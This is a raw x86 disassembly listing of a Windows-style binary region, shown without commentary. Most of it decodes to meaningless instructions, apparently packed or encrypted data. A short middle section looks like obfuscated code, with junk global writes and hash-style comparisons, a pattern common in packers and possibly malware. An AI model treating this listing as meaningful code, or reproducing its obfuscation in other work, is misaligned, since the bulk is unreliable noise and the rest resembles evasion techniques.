  40a827:	(bad)  
  40a828:	in     al,0x27
  40a82a:	pop    esi
  40a82b:	push   edx
  40a82c:	sbb    al,0xf4
  40a82e:	stos   BYTE PTR es:[edi],al
  40a82f:	dec    ebp
  40a830:	sbb    al,0x6e
  40a832:	mov    ecx,DWORD PTR [edx+esi*8+0x2920f5cf]
  40a839:	popa   
  40a83a:	mov    WORD PTR [ebx-0x134d8cc],gs
  40a840:	aam    0xea
  40a842:	into   
  40a843:	shl    BYTE PTR [edi+ebp*2-0x634c0d00],cl
  40a84a:	jg     0x40a897
  40a84c:	pusha  
  40a84d:	push   esp
  40a84e:	push   0x8a25702e
  40a853:	int    0x58
  40a855:	into   
  40a856:	loopne 0x40a83b
  40a858:	jg     0x40a831
  40a85a:	mov    ds:0x8843bd68,eax
  40a85f:	jg     0x40a83f
  40a861:	or     BYTE PTR [edx],0xc3
  40a864:	jmp    0x2e627bda
  40a869:	push   esp
  40a86a:	push   eax
  40a86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a86c:	or     edi,0x686670bb
  40a872:	mov    edi,0xcdfac83a
  40a877:	add    eax,edi
  40a879:	push   0xffffff9d
  40a87b:	scas   al,BYTE PTR es:[edi]
  40a87c:	xchg   DWORD PTR [ecx-0x7eab7392],edx
  40a882:	sbb    ch,0x21
  40a885:	fsub   QWORD PTR [edx+ebx*4-0x6]
  40a889:	mov    ch,0xfa
  40a88b:	sub    DWORD PTR [ebx],0x3b
  40a88e:	lods   eax,DWORD PTR ds:[esi]
  40a88f:	inc    ebp
  40a890:	mov    ?,ecx
  40a892:	leave  
  40a893:	jg     0x40a8ec
  40a895:	daa    
  40a896:	(bad)  
  40a897:	out    0xc0,al
  40a899:	add    al,0x1b
  40a89b:	xor    BYTE PTR [ecx+0x3e],0x0
  40a89f:	in     eax,0x5a
  40a8a1:	sub    BYTE PTR cs:[eax+0x56],ah
  40a8a5:	adc    DWORD PTR ds:0xd85001cf,0xffffff8b
  40a8ac:	mov    eax,0x3dc3fea
  40a8b1:	xor    BYTE PTR [esi-0x576d4cae],bh
  40a8b7:	rcr    DWORD PTR [eax],0x6d
  40a8ba:	or     bl,cl
  40a8bc:	pushf  
  40a8bd:	jbe    0x40a917
  40a8bf:	sub    al,0xd
  40a8c1:	out    0xd,eax
  40a8c3:	sub    dl,BYTE PTR [esi+0x6c7775e4]
  40a8c9:	retfw  0x5723
  40a8cd:	(bad)  
  40a8cf:	aam    0x17
  40a8d1:	pop    edi
  40a8d2:	data16 lock jle 0x40a886
  40a8d6:	jl     0x40a8f9
  40a8d8:	(bad)  
  40a8d9:	mov    bl,0x72
  40a8db:	(bad)  
  40a8dc:	xchg   ebx,eax
  40a8dd:	jns    0x40a8d9
  40a8df:	faddp  st(3),st
  40a8e1:	leave  
  40a8e2:	jge    0x40a8e5
  40a8e4:	test   BYTE PTR [ebx-0x23],dh
  40a8e7:	imul   esp,DWORD PTR [eax-0x717b07cc],0x56519da0
  40a8f1:	mov    edi,0x4f7b7702
  40a8f6:	scas   eax,DWORD PTR es:[edi]
  40a8f7:	into   
  40a8f8:	test   BYTE PTR [ecx],ah
  40a8fa:	pusha  
  40a8fb:	in     eax,0x8f
  40a8fd:	dec    eax
  40a8fe:	inc    esi
  40a8ff:	test   al,0x8b
  40a901:	sub    eax,ebx
  40a903:	adc    al,BYTE PTR [ecx+0x63]
  40a906:	cmp    esi,DWORD PTR [eax+0x29c8eca7]
  40a90c:	aas    
  40a90d:	cmp    dl,cl
  40a90f:	ret    
  40a910:	mov    ds:0x289984dc,eax
  40a915:	div    DWORD PTR [edi+0x4]
  40a918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a919:	inc    edx
  40a91a:	mov    dl,0x42
  40a91c:	dec    esi
  40a91d:	cld    
  40a91e:	jl     0x40a90d
  40a920:	jmp    0x440e945c
  40a925:	(bad)  
  40a927:	(bad)  [ebp-0x61d39cab]
  40a92d:	mov    bl,0xd8
  40a92f:	mov    BYTE PTR [ecx+edx*2-0x5a],cl
  40a933:	nop
  40a934:	adc    ebx,esp
  40a936:	outs   dx,DWORD PTR ds:[esi]
  40a937:	dec    edi
  40a938:	dec    edi
  40a939:	fild   QWORD PTR [esp+eax*4-0x48852f45]
  40a940:	and    DWORD PTR [ecx+0x2b4432d4],edx
  40a946:	cdq    
  40a947:	dec    edx
  40a948:	pop    ds
  40a949:	int3   
  40a94a:	adc    al,0x8f
  40a94c:	(bad)  
  40a94d:	jp     0x40a8d7
  40a94f:	mov    ds:0xcd7cd63f,al
  40a954:	shl    DWORD PTR [ebp-0x6bc86955],cl
  40a95a:	fwait
  40a95b:	and    DWORD PTR [edi-0x7a],ebp
  40a95e:	mov    ds:0x7ffee08f,al
  40a963:	pusha  
  40a964:	test   BYTE PTR [esi-0x28],ah
  40a967:	js     0x40a9aa
  40a969:	sahf   
  40a96a:	mov    bh,0x86
  40a96c:	sbb    DWORD PTR [ebp-0x39],ecx
  40a96f:	pop    esp
  40a970:	pusha  
  40a971:	mov    bl,0x25
  40a973:	and    dh,BYTE PTR [esi+0x5]
  40a976:	mov    al,0xb5
  40a978:	pop    edx
  40a979:	inc    ecx
  40a97a:	mov    edx,0xb3d8562a
  40a97f:	repz sub BYTE PTR [eax-0x5e42d51f],ch
  40a986:	aas    
  40a987:	cdq    
  40a988:	aas    
  40a989:	sar    DWORD PTR [eax+0x57861669],0x78
  40a990:	sar    DWORD PTR [esi-0xb706e7a],0x35
  40a997:	(bad)  
  40a998:	fisubr DWORD PTR [eax+ebx*1-0x2bb36bf3]
  40a99f:	addr16 loope 0x40a9eb
  40a9a2:	aam    0x3
  40a9a4:	jle    0x40a92a
  40a9a6:	and    DWORD PTR [ebp+0x46],eax
  40a9a9:	out    0x9,eax
  40a9ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9ac:	push   ds
  40a9ad:	outs   dx,DWORD PTR ds:[esi]
  40a9ae:	cmp    eax,0xea4f30f5
  40a9b3:	jge    0x40a969
  40a9b5:	push   ecx
  40a9b6:	and    edi,DWORD PTR [edx]
  40a9b8:	push   ebp
  40a9b9:	pop    edx
  40a9ba:	shl    DWORD PTR ds:0x73b5d92c,0xc9
  40a9c1:	not    DWORD PTR [ecx+edx*2+0x2da6a109]
  40a9c8:	cmp    dl,BYTE PTR gs:[ecx]
  40a9cb:	iret   
  40a9cc:	je     0x40a94e
  40a9ce:	dec    edx
  40a9cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d0:	push   esi
  40a9d1:	jbe    0x40a9a0
  40a9d3:	ss es je 0x40a9f4
  40a9d7:	sbb    al,ch
  40a9d9:	pop    ebx
  40a9da:	pop    es
  40a9db:	mov    eax,ds:0xa75ee9
  40a9e0:	cwde   
  40a9e1:	push   esp
  40a9e2:	hlt    
  40a9e3:	cli    
  40a9e4:	mov    eax,DWORD PTR [eax+0x4523d4dc]
  40a9ea:	aas    
  40a9eb:	call   0x3d7f:0xc2e799f9
  40a9f2:	xor    al,0x4d
  40a9f4:	sbb    BYTE PTR [ecx],al
  40a9f6:	sbb    eax,0x8fbab370
  40a9fb:	repz xor eax,0xe4fd97b3
  40aa01:	add    DWORD PTR [ebx-0x36],0xffffff8e
  40aa05:	stos   DWORD PTR es:[edi],eax
  40aa06:	mov    ah,0x46
  40aa08:	retf   
  40aa09:	clc    
  40aa0a:	adc    al,0x12
  40aa0c:	mov    al,0x8a
  40aa0e:	(bad)  [esp+eax*2-0x63]
  40aa12:	xchg   edi,eax
  40aa13:	mov    ebx,0xaef9462d
  40aa18:	add    BYTE PTR [ebx+0x6108254f],bh
  40aa1e:	add    BYTE PTR [ebp+ebx*2-0x54],ah
  40aa22:	lea    ebp,[ebp-0x745f1564]
  40aa28:	loopne 0x40a9e3
  40aa2a:	mov    edi,0xbea2ae0c
  40aa2f:	lods   al,BYTE PTR ds:[esi]
  40aa30:	rol    DWORD PTR [eax+0x2c],cl
  40aa33:	into   
  40aa34:	test   al,0x60
  40aa36:	push   ss
  40aa37:	std    
  40aa38:	push   cs
  40aa39:	imul   esp,esp,0xffffffce
  40aa3c:	mov    bl,0xba
  40aa3e:	or     bl,dl
  40aa40:	adc    esi,DWORD PTR [eax-0x3c71dea3]
  40aa46:	cmp    al,0xb3
  40aa48:	(bad)  
  40aa49:	lea    esp,[edi-0x62]
  40aa4c:	jmp    FWORD PTR [esi+0xb]
  40aa4f:	lahf   
  40aa50:	and    DWORD PTR [ebx+0xfbdd36],edi
  40aa56:	pop    es
  40aa57:	out    dx,al
  40aa58:	jg     0x40aabe
  40aa5a:	dec    eax
  40aa5b:	cmc    
  40aa5c:	mov    BYTE PTR [eax+0x0],dl
  40aa5f:	lahf   
  40aa60:	mov    esi,0x695cb833
  40aa65:	pop    edi
  40aa66:	loope  0x40aa74
  40aa68:	jmp    0x40a9f6
  40aa6a:	adc    BYTE PTR [esi-0x77],ah
  40aa6d:	(bad)  [ecx+eiz*4+0x61f4ed53]
  40aa74:	pop    edx
  40aa75:	scas   al,BYTE PTR es:[edi]
  40aa76:	mov    dl,0x76
  40aa78:	pop    esi
  40aa79:	outs   dx,DWORD PTR ds:[esi]
  40aa7a:	sbb    bl,cl
  40aa7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa7d:	push   es
  40aa7e:	lods   al,BYTE PTR ds:[esi]
  40aa7f:	sbb    cl,BYTE PTR [ebp+eax*8-0xfd347ae]
  40aa86:	sahf   
  40aa87:	add    BYTE PTR [edi],dh
  40aa89:	jo     0x40aa42
  40aa8b:	xchg   esi,eax
  40aa8c:	sbb    eax,0x7ac29eef
  40aa91:	aaa    
  40aa92:	repz xchg esp,eax
  40aa94:	mov    esp,ebp
  40aa96:	sub    BYTE PTR [ebx],ah
  40aa98:	sbb    DWORD PTR [ebx+ebx*2-0x57],esp
  40aa9c:	add    al,0x62
  40aa9e:	into   
  40aa9f:	jle    0x40aaee
  40aaa1:	fidiv  DWORD PTR [edi+0x66a0eba9]
  40aaa7:	add    ch,bh
  40aaa9:	ret    0xb900
  40aaac:	aaa    
  40aaad:	xor    DWORD PTR [ecx-0x1c19b85d],eax
  40aab3:	lods   eax,DWORD PTR ds:[esi]
  40aab4:	and    esp,DWORD PTR [eax-0x4229799e]
  40aaba:	ins    BYTE PTR es:[edi],dx
  40aabb:	dec    esp
  40aabc:	shl    BYTE PTR [edx+0x21],1
  40aabf:	sar    BYTE PTR [edx+0x1],0xe6
  40aac3:	cmp    esp,DWORD PTR ds:0x90e7381d
  40aac9:	mov    esi,0x2866b974
  40aace:	adc    eax,0xa70535d7
  40aad3:	jb     0x40aaf8
  40aad5:	mov    edi,DWORD PTR [edx]
  40aad7:	jecxz  0x40aaf9
  40aad9:	lods   eax,DWORD PTR ds:[esi]
  40aada:	sub    eax,DWORD PTR [eax+ecx*1]
  40aadd:	scas   al,BYTE PTR es:[edi]
  40aade:	scas   al,BYTE PTR es:[edi]
  40aadf:	setb   ch
  40aae2:	pop    es
  40aae3:	arpl   WORD PTR [edx],si
  40aae5:	pusha  
  40aae6:	pop    edx
  40aae7:	aam    0xb5
  40aae9:	pop    esi
  40aaea:	in     eax,dx
  40aaeb:	int3   
  40aaec:	mov    edi,0x385fca76
  40aaf1:	int3   
  40aaf2:	js     0x40aab3
  40aaf4:	ss dec ebx
  40aaf6:	push   0xc43e06df
  40aafb:	add    BYTE PTR [edx],dh
  40aafd:	lods   eax,DWORD PTR ds:[esi]
  40aafe:	inc    esi
  40aaff:	gs push 0xbb03b6ce
  40ab05:	popa   
  40ab06:	nop
  40ab07:	sub    bh,bl
  40ab09:	sbb    esi,DWORD PTR [esi+0x67]
  40ab0c:	xchg   edi,eax
  40ab0d:	mov    ebx,0x98dfff59
  40ab12:	adc    al,0xd5
  40ab14:	xchg   ebx,eax
  40ab15:	xlat   BYTE PTR ds:[ebx]
  40ab16:	(bad)  [ecx-0x19]
  40ab19:	sbb    al,0x35
  40ab1b:	dec    ecx
  40ab1c:	mov    ebp,0xd882e8bd
  40ab21:	out    dx,al
  40ab22:	call   0x966f:0x61bd3fb
  40ab29:	lods   al,BYTE PTR ds:[esi]
  40ab2a:	dec    edi
  40ab2b:	popa   
  40ab2c:	outs   dx,DWORD PTR ds:[esi]
  40ab2d:	das    
  40ab2e:	and    al,0xff
  40ab30:	lock and ecx,DWORD PTR [ebx]
  40ab33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab34:	in     eax,dx
  40ab35:	stos   DWORD PTR es:[edi],eax
  40ab36:	xchg   edx,eax
  40ab37:	or     al,0x4
  40ab39:	inc    ebx
  40ab3a:	mov    eax,0x6be2dbbd
  40ab3f:	inc    ecx
  40ab40:	xor    ecx,esi
  40ab42:	mov    DWORD PTR ds:0x42a2e6,0x254
  40ab4c:	cmp    ecx,eax
  40ab4e:	je     0x40d111
  40ab54:	mov    eax,DWORD PTR [ebp-0x4]
  40ab57:	and    DWORD PTR ds:0x42a28a,0x5384
  40ab61:	xor    eax,esi
  40ab63:	add    DWORD PTR ds:0x42a2fa,0x7b59
  40ab6d:	add    eax,edi
  40ab6f:	cmp    ebx,eax
  40ab71:	mov    DWORD PTR ds:0x42a2e6,0x2910
  40ab7b:	jne    0x40d0af
  40ab81:	xor    DWORD PTR ds:0x42a276,0x42a2d6
  40ab8b:	push   DWORD PTR [ebp+0x8]
  40ab8e:	call   0x424f07
  40ab93:	and    DWORD PTR ds:0x42a266,edi
  40ab99:	mov    DWORD PTR [ebp-0x14],eax
  40ab9c:	xor    ecx,ecx
  40ab9e:	xor    ecx,DWORD PTR ds:0x42a306
  40aba4:	mov    eax,ds:0x42a3a2
  40aba9:	sub    ecx,eax
  40abab:	or     ecx,DWORD PTR [ecx+eax*1]
  40abae:	mov    eax,DWORD PTR [ebp-0x4]
  40abb1:	sbb    ecx,0x17a4
  40abb7:	mov    ecx,DWORD PTR [ebp-0x14]
  40abba:	xor    DWORD PTR ds:0x42a28a,0x42a2a6
  40abc4:	xor    eax,esi
  40abc6:	add    eax,edi
  40abc8:	mov    DWORD PTR ds:0x42a25a,0x307a
  40abd2:	cmp    ecx,eax
  40abd4:	mov    DWORD PTR ds:0x42a2be,0xd4
  40abde:	je     0x40d1cc
  40abe4:	or     DWORD PTR ds:0x42a2c6,0x42a266
  40abee:	push   DWORD PTR [ebp-0x14]
  40abf1:	not    DWORD PTR ds:0x42a2a6
  40abf7:	push   DWORD PTR [ebp+0x8]
  40abfa:	sbb    DWORD PTR ds:0x42a2ae,0x3b6a
  40ac04:	call   0x424fc7
  40ac09:	mov    DWORD PTR [ebp-0x14],eax
  40ac0c:	or     eax,DWORD PTR ds:0x42a2be
  40ac12:	mov    eax,DWORD PTR [ebp-0x4]
  40ac15:	mov    ecx,DWORD PTR [ebp-0x14]
  40ac18:	xor    eax,esi
  40ac1a:	and    DWORD PTR ds:0x42a2da,0x42a2fe
  40ac24:	add    eax,edi
  40ac26:	cmp    ecx,eax
  40ac28:	mov    DWORD PTR ds:0x42a2d6,0x7d26
  40ac32:	je     0x40d1cc
  40ac38:	xor    ecx,DWORD PTR ds:0x42a2ea
  40ac3e:	mov    eax,DWORD PTR [ebp-0x14]
  40ac41:	mov    eax,DWORD PTR [eax+0x18]
  40ac44:	or     DWORD PTR ds:0x42a29a,0x5e55
  40ac4e:	mov    DWORD PTR [ebp-0x24],eax
  40ac51:	xor    DWORD PTR ds:0x42a2be,ecx
  40ac57:	mov    eax,DWORD PTR [ebp-0x14]
  40ac5a:	and    DWORD PTR ds:0x42a2ee,0x0
  40ac64:	mov    ecx,DWORD PTR ds:0x42a2ee
  40ac6a:	inc    ecx
  40ac6b:	mov    DWORD PTR ds:0x42a2ee,ecx
  40ac71:	cmp    DWORD PTR ds:0x42a2ee,0x1f
  40ac78:	jb     0x40acb0
  40ac7e:	jmp    0x40aca3
  40ac83:	push   DWORD PTR [ebp-0x28]
  40ac86:	push   0x6caa
  40ac8b:	push   0x1820
  40ac90:	push   0x670f
  40ac95:	push   0x3854
  40ac9a:	push   DWORD PTR [ebp-0x24]
  40ac9d:	call   DWORD PTR ds:0x42a3c2
  40aca3:	cmp    DWORD PTR ds:0x42a2ee,0x14
  40acaa:	jb     0x40ac64
  40acb0:	mov    ecx,DWORD PTR [ebp+0x8]
  40acb3:	add    ecx,DWORD PTR [eax+0x20]
  40acb6:	movzx  eax,BYTE PTR ds:0x42a2e6
  40acbd:	adc    DWORD PTR ds:0x42a286,eax
  40acc3:	mov    DWORD PTR [ebp-0x2c],ecx
  40acc6:	adc    DWORD PTR ds:0x42a2b6,ecx
  40accc:	mov    eax,DWORD PTR [ebp-0x14]
  40accf:	sbb    ecx,DWORD PTR ds:0x42a262
  40acd5:	jmp    0x40d063
  40acda:	test   BYTE PTR fs:[esi],bl
  40acdd:	pop    es
  40acde:	sahf   
  40acdf:	and    DWORD PTR [edx-0x80],0x235b4cfa
  40ace6:	and    BYTE PTR [ecx+0x1f],cl
  40ace9:	fs pop eax
  40aceb:	lock add DWORD PTR [ebx-0x7c7ca1f4],0xffffff9a
  40acf3:	jb     0x40ac7c
  40acf5:	xlat   BYTE PTR ds:[ebx]
  40acf6:	rol    DWORD PTR [ebx+0x3a],1
  40acf9:	(bad)  
  40acfb:	sub    BYTE PTR [esp+ebx*1-0x12],0xc8
  40ad00:	mov    bh,0x55
  40ad02:	das    
  40ad03:	xor    al,0x4a
  40ad05:	call   0xd34efff2
  40ad0a:	add    edx,edi
  40ad0c:	pop    esp
  40ad0d:	or     al,0xc0
  40ad0f:	and    esp,eax
  40ad11:	(bad)  
  40ad12:	adc    eax,0x9c47b279
  40ad17:	addr16 (bad) 
  40ad19:	cmp    BYTE PTR [edx],bl
  40ad1b:	lds    eax,FWORD PTR [esi-0xec89a75]
  40ad21:	push   0xb0c3184e
  40ad26:	in     eax,dx
  40ad27:	adc    eax,0xd3b6c813
  40ad2c:	sbb    al,0x29
  40ad2e:	mov    bh,0x73
  40ad30:	sbb    al,ah
  40ad32:	loop   0x40ad2d
  40ad34:	loopne 0x40ad82
  40ad36:	inc    ebp
  40ad37:	push   ecx
  40ad38:	sbb    al,0x2c
  40ad3a:	out    0x8,eax
  40ad3c:	cmp    al,0xf
  40ad3e:	leave  
  40ad3f:	mov    ch,0xc7
  40ad41:	jae    0x40acd3
  40ad43:	mov    edx,0xba2bca04
  40ad48:	xchg   edi,eax
  40ad49:	lds    edx,FWORD PTR [ebp+0x30]
  40ad4c:	pop    edi
  40ad4d:	or     esi,0x15
  40ad50:	cmp    al,0x79
  40ad52:	mov    ds:0x65d1752d,eax
  40ad57:	test   eax,0x331932a9
  40ad5d:	jo     0x40ad8c
  40ad5f:	enter  0xc56b,0x7
  40ad63:	out    0xb0,al
  40ad65:	xchg   esi,eax
  40ad66:	and    BYTE PTR [ecx+edx*1],bh
  40ad69:	xchg   ebx,eax
  40ad6a:	xchg   DWORD PTR [ecx],eax
  40ad6c:	std    
  40ad6d:	test   DWORD PTR [esi-0xbf6f311],edx
  40ad73:	out    0xfe,al
  40ad75:	and    DWORD PTR [edx],ebx
  40ad77:	sub    ch,ch
  40ad79:	and    cl,ch
  40ad7b:	fdiv   DWORD PTR [ecx]
  40ad7d:	outs   dx,BYTE PTR ds:[esi]
  40ad7e:	jo     0x40add2
  40ad80:	ds push 0x13b721d1
  40ad86:	sub    eax,0x533b1fe8
  40ad8b:	das    
  40ad8c:	daa    
  40ad8d:	push   edi
  40ad8e:	rcr    BYTE PTR [edi],1
  40ad90:	inc    edi
  40ad91:	jmp    0xe6ac:0x9b7f8ff3
  40ad98:	dec    ebx
  40ad99:	mov    ch,0x8
  40ad9b:	sub    eax,0xed316cf8
  40ada0:	aam    0x53
  40ada2:	mov    ecx,0xba5192fc
  40ada7:	cmp    cl,BYTE PTR [ebx-0x4feb3d35]
  40adad:	push   ebp
  40adae:	mov    edi,0xf128bfb0
  40adb3:	jae    0x40ae02
  40adb5:	dec    esi
  40adb6:	ss xchg ebx,eax
  40adb8:	(bad)  
  40adb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adba:	scas   al,BYTE PTR es:[edi]
  40adbb:	loope  0x40adfd
  40adbd:	and    bl,BYTE PTR [ebx]
  40adbf:	out    dx,eax
  40adc0:	ss out dx,al
  40adc2:	pop    edi
  40adc3:	(bad)  
  40adc4:	je     0x40ae22
  40adc6:	pop    ds
  40adc7:	mov    esp,0x1a2754c5
  40adcc:	sbb    esp,ebx
  40adce:	ret    0xd32a
  40add1:	cld    
  40add2:	add    eax,0x4f9522cd
  40add7:	les    esi,FWORD PTR [esi]
  40add9:	les    esi,FWORD PTR [eax-0x77]
  40addc:	pop    ecx
  40addd:	stos   BYTE PTR es:[edi],al
  40adde:	lea    ecx,[esi+ebp*1-0x4ec2358d]
  40ade5:	mov    ?,ebx
  40ade7:	out    dx,eax
  40ade8:	in     eax,dx
  40ade9:	fwait
  40adea:	jl     0x40add4
  40adec:	(bad)  
  40aded:	arpl   si,cx
  40adef:	repnz xor ch,BYTE PTR [eax-0x2f]
  40adf3:	mov    edi,0x926a8e5b
  40adf8:	and    BYTE PTR [edi],0x84
  40adfb:	xchg   ebp,eax
  40adfc:	daa    
  40adfd:	(bad)
  40ae00:	ret    0xa5ca
  40ae03:	push   0x58a489a9
  40ae08:	iret   
  40ae09:	jg     0x40adf0
  40ae0b:	sub    DWORD PTR [eax+0x941046],eax
  40ae11:	sbb    dh,BYTE PTR [eax]
  40ae13:	cmp    eax,0x94f0a286
  40ae18:	das    
  40ae19:	and    edi,edi
  40ae1b:	jmp    0xa86a4cbd
  40ae20:	test   al,0xd4
  40ae22:	xchg   ecx,eax
  40ae23:	inc    eax
  40ae24:	xchg   BYTE PTR [esi+0xa],ah
  40ae27:	add    DWORD PTR [ecx],esp
  40ae29:	mov    al,0x12
  40ae2b:	rcl    BYTE PTR [eax+0xb58a655],1
  40ae31:	repz jp 0x40adbe
  40ae34:	in     eax,dx
  40ae35:	mov    ebp,DWORD PTR [ebx-0x14586d75]
  40ae3b:	adc    DWORD PTR [ecx+0x2d],0xffffffb4
  40ae3f:	arpl   WORD PTR [ebp+0x6c],bx
  40ae42:	mov    cl,0x6e
  40ae44:	push   0x15
  40ae46:	cs (bad) 
  40ae48:	daa    
  40ae49:	pop    ebx
  40ae4a:	pop    ecx
  40ae4b:	push   edi
  40ae4c:	fld    DWORD PTR [ebx-0x54035f97]
  40ae52:	sbb    edi,DWORD PTR [edx+0x64]
  40ae55:	dec    ebx
  40ae56:	or     eax,0x34111da0
  40ae5b:	push   ecx
  40ae5c:	mov    edi,0xfb805566
  40ae61:	fwait
  40ae62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae63:	lock iret 
  40ae65:	shl    DWORD PTR [eax-0x66],cl
  40ae68:	mov    edx,0x68550837
  40ae6d:	pop    ecx
  40ae6e:	sar    esi,0x3e
  40ae71:	enter  0x3447,0xc2
  40ae75:	push   0xffffff90
  40ae77:	jne    0x40aedf
  40ae79:	mov    ecx,eax
  40ae7b:	imul   esi,esp,0x5c031f08
  40ae81:	adc    al,0xa0
  40ae83:	pmaxub mm5,QWORD PTR [edx-0x80]
  40ae87:	hlt    
  40ae88:	add    al,0x70
  40ae8a:	sbb    BYTE PTR [ebx+0x3a],bl
  40ae8d:	cdq    
  40ae8e:	mov    dh,0x55
  40ae90:	push   ebx
  40ae91:	js     0x40ae82
  40ae93:	gs jmp 0xfb00:0x94dcda9e
  40ae9b:	sub    cl,bl
  40ae9d:	test   eax,0x43fcf06
  40aea2:	add    cl,BYTE PTR [ecx+0x23f63ceb]
  40aea8:	inc    ecx
  40aea9:	xor    bh,BYTE PTR [edi]
  40aeab:	sbb    ebp,DWORD PTR [esi]
  40aead:	pop    ecx
  40aeae:	mov    dl,0x2
  40aeb0:	sbb    bh,BYTE PTR [eax]
  40aeb2:	pop    ds
  40aeb3:	test   BYTE PTR [ebx-0x52ec9b3e],al
  40aeb9:	jmp    0x621a:0x87d6bf29
  40aec0:	or     dl,BYTE PTR [ebp+ebx*2+0x61]
  40aec4:	sbb    al,0xfa
  40aec6:	mov    al,0x5a
  40aec8:	mul    DWORD PTR [edx+0x7c]
  40aecb:	inc    edi
  40aecc:	adc    cl,BYTE PTR [ecx]
  40aece:	out    dx,eax
  40aecf:	fst    QWORD PTR [eax+0x55]
  40aed2:	adc    eax,0xacb39919
  40aed7:	pop    eax
  40aed8:	ins    BYTE PTR es:[edi],dx
  40aed9:	lock xor BYTE PTR [ecx],bl
  40aedc:	xchg   DWORD PTR [ebx-0x3],esp
  40aedf:	pop    DWORD PTR [edx]
  40aee1:	fwait
  40aee2:	inc    esi
  40aee3:	lods   eax,DWORD PTR ds:[esi]
  40aee4:	jge    0x40aea6
  40aee6:	ss inc esi
  40aee8:	aaa    
  40aee9:	pop    ds
  40aeea:	add    al,0xd
  40aeec:	sub    eax,0xffc304fe
  40aef1:	xor    eax,0xcb10cbbe
  40aef6:	mov    eax,0xa450f847
  40aefb:	adc    ch,BYTE PTR [ecx-0x44]
  40aefe:	xor    al,0x66
  40af00:	add    ebx,ecx
  40af02:	xchg   esi,eax
  40af03:	xor    al,BYTE PTR [edx]
  40af05:	or     DWORD PTR [eax],esp
  40af07:	xchg   DWORD PTR [edi],esi
  40af09:	std    
  40af0a:	rcl    cl,1
  40af0c:	imul   ecx,DWORD PTR [eax+0x62],0x59a017dc
  40af13:	and    al,0x89
  40af15:	xchg   ebx,eax
  40af16:	push   edi
  40af17:	or     BYTE PTR [esi-0x8429d89],0x93
  40af1e:	cmp    eax,0x12db5663
  40af23:	inc    ebx
  40af24:	data16 jb 0x40af2e
  40af27:	jns    0x40aeef
  40af29:	dec    ecx
  40af2a:	xchg   BYTE PTR [ebp*1+0x3f4e8b64],dl
  40af31:	jne    0x40af06
  40af33:	ins    BYTE PTR es:[edi],dx
  40af34:	out    dx,al
  40af35:	clc    
  40af36:	mov    DWORD PTR [ebp-0xc],edx
  40af39:	jmp    0x11c4:0x17d7efc8
  40af40:	adc    ebp,DWORD PTR [edi]
  40af42:	mov    BYTE PTR [edi],bl
  40af44:	jg     0x40af6b
  40af46:	imul   edi,ecx,0xffffffba
  40af49:	mov    es,edx
  40af4b:	test   eax,0x2c4401ba
  40af50:	dec    edi
  40af51:	xchg   edx,eax
  40af52:	inc    edx
  40af53:	ins    BYTE PTR es:[edi],dx
  40af54:	lds    esp,FWORD PTR [eax]
  40af56:	add    bh,BYTE PTR [ebp+ecx*4+0x68ff53eb]
  40af5d:	or     DWORD PTR [ebx+0x14926441],edx
  40af63:	add    esp,DWORD PTR [ebp-0x55878afd]
  40af69:	daa    
  40af6a:	or     DWORD PTR [eax+0x5801a3e],esp
  40af70:	out    0xfc,al
  40af72:	dec    esi
  40af73:	fcomp  QWORD PTR [edx]
  40af75:	cmc    
  40af76:	(bad)  
  40af77:	aas    
  40af78:	scas   al,BYTE PTR es:[edi]
  40af79:	mov    bl,0xd8
  40af7b:	cmp    DWORD PTR [ecx+eax*8+0x6f40d89b],ebx
  40af82:	ins    BYTE PTR es:[edi],dx
  40af83:	dec    edi
  40af84:	jg     0x40afbb
  40af86:	fstp   TBYTE PTR ds:0x4d2aab3a
  40af8c:	mov    dl,0xeb
  40af8e:	dec    esp
  40af8f:	mov    eax,0xfa9bc473
  40af94:	or     al,0x90
  40af96:	lock mov dl,0xef
  40af99:	(bad)  
  40af9a:	jmp    0x6cb41889
  40af9f:	inc    esp
  40afa0:	sbb    BYTE PTR [ecx],bh
  40afa2:	xchg   ecx,eax
  40afa3:	sbb    edi,DWORD PTR [ebx]
  40afa5:	jecxz  0x40af93
  40afa7:	ret    
  40afa8:	jecxz  0x40aff0
  40afaa:	out    0x46,eax
  40afac:	mov    edx,0x47059671
  40afb1:	sbb    BYTE PTR [ebp-0x23e8769],dh
  40afb7:	jl     0x40af7e
  40afb9:	aas    
  40afba:	cld    
  40afbb:	inc    edx
  40afbc:	mov    edi,0xa07f6509
  40afc1:	popa   
  40afc2:	inc    edi
  40afc3:	(bad)  
  40afc4:	call   0xece:0xd760ccc6
  40afcb:	jo     0x40b03a
  40afcd:	jnp    0x40b040
  40afcf:	cli    
  40afd0:	mov    esp,0x99c5f6dd
  40afd5:	inc    ebp
  40afd6:	add    eax,0xae4306cf
  40afdb:	sub    DWORD PTR [edi],ecx
  40afdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afde:	xor    BYTE PTR [esi-0x23],ch
  40afe1:	push   edi
  40afe2:	xor    eax,0x6c1d0add
  40afe7:	mov    ah,0x45
  40afe9:	inc    ebx
  40afea:	sbb    BYTE PTR [esi],dh
  40afec:	psllw  mm3,QWORD PTR [edi+0x18]
  40aff0:	call   0xdaec:0xece71d10
  40aff7:	test   eax,0xba160aa
  40affc:	ror    BYTE PTR [ebp-0x37],1
  40afff:	pop    esp
  40b000:	movd   mm3,DWORD PTR [esi+ebp*1+0x4c]
  40b005:	cmp    eax,DWORD PTR [esi]
  40b007:	push   0x4
  40b009:	mov    esp,0xce946a3
  40b00e:	mov    ecx,0x509eb3bd
  40b013:	in     al,dx
  40b014:	push   ebp
  40b015:	pop    esp
  40b016:	(bad)  
  40b017:	iret   
  40b018:	aaa    
  40b019:	lock lods al,BYTE PTR ds:[esi]
  40b01b:	je     0x40afaf
  40b01d:	mov    eax,ds:0x4b7b1190
  40b022:	dec    edi
  40b023:	cld    
  40b024:	int    0x28
  40b026:	dec    esi
  40b027:	mov    eax,ds:0x869c9c19
  40b02c:	push   0x1ec1fd70
  40b031:	pop    es
  40b032:	(bad)  
  40b033:	lods   al,BYTE PTR ds:[esi]
  40b034:	sub    ebp,DWORD PTR [ebp+0x6d7ac7b1]
